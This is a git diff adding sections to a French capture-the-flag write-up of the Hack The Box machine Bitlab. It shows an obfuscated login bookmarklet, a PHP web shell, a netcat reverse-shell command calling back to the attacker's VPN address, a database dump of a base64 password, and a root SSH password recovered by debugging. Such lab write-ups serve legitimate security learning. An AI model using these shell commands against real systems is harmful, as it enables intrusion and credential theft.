@@ -60,6 +60,8 @@ Comme vous le remarquez, lorsqu'ont clique sur Gitlab login il n'y a rien, affic
     </DL><p>
 </DL><p>
 ```
+## Premier shell en www-data
+
 Regardons plus précisement la partie en javascript:
 ```javascript
 javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
@@ -77,5 +79,72 @@ system($_GET["c"]);
 echo "</pre>";
 ?> 
 ```
+Très bien, maintenant executons un reverse shell vi cette commande:
+```?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff```
+N'oubliez pas de changer les xx par votre ip sur le VPN et aussi ne soyez pas strupide ça va pas marcher si vous n'ouvrez pas votre port 1337 xD
+```
+quasar@pwn:~/rootme$ nc -lvnp 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+```
+Executons ```$ python -c "import pty;pty.spawn('/bin/bash')"``` pour un shell plus propre. 
+Essayons donc de récuperer les crédentials ssh de clave à partir de Postegresql
 
+## Shell en tant que clave, user flag
 
+Essayons tout d'abord de nous connecté à postgresql via la commande psql mais ..
+```
+www-data@bitlab:/var/www/html/profile$ psql
+bash: psql: command not found
+www-data@bitlab:/var/www/html/profile$ 
+```
+
+Cela ne fonctionne malheuresement pas, mais ce n'est pas un bien gros problème ! Executons php en interactive:
+```
+www-data@bitlab:/var/www/html/profile$ php -a
+Interactive mode enabled
+
+php > 
+```
+Et connectons nous à la base de donné comme ceci:
+```php
+$basededonne = new PDO('pgsql:host=localhost;dbname=profiles', 'profiles', 'profiles');
+```
+Et recpérons tout:
+```php
+$all = $basededonne->query("SELECT * FROM profiles");
+$profile = $all->fetchAll();
+print_r($profile);
+```
+On récupère donc:
+```
+Array
+(
+    [0] => Array
+        (
+            [id] => 1
+            [0] => 1
+            [username] => clave
+            [1] => clave
+            [password] => c3NoLXN0cjBuZy1wQHNz==
+            [2] => c3NoLXN0cjBuZy1wQHNz==
+        )
+
+)
+```
+# Root ! Un peu de reverse engineering !
+
+Et voici donc les credentials pour le ssh !
+![image](image4.png)
+Mhhhhhhhhhhhhh ! Ca sent le reverse ! C'est cool de rencontrer du RE dans une box HTB ! Téléchargons donc ça et lancons nous!
+Excusez moi, mais ma machine Windows à un peu planté et je ne peux donc pas vous montrer, il suffit de debug avec x64dbg en regardent ce que contient le registre EAX à chaque fois ont se rencontre à un moment qu'il contient : "ssh root@gitlab.htb -pw "Qf7]8YSV.wDNF*\[7d?j&eD4^"
+
+On use alors les credentials root:Qf7]8YSV.wDNF*\[7d?j&eD4^
+
+Et on a le shell en tant que root !
+![image](image5.png)
+
+Et voila !!
+N'hésitez pas à me follow sur Twitter: @QuasarPwn
+et à rejoindre mon serveur discord : [Mon serveur Discord](https://discord.gg/2bwhtP7)
+
+Aller je vous laisse, ;-)
